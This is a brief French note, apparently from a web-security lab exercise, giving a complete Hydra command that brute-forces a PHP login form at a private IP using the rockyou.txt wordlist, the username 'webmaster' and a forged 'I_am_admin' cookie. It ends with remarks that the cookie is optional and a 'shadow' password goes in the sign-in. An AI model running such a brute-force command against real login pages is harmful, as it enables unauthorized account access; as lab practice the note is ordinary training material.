sur vm avec hydra

hydra -f -l webmaster -P /home/vline/Téléchargements/rockyou.txt 10.13.247.194 http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:H=Cookie:I_am_admin=68934a3e9455fa72420237eb05902327; security=low:F=images/WrongAnswer.gif"

coockie pas indispensable

mot de passe shadow a mettre dans le sign in
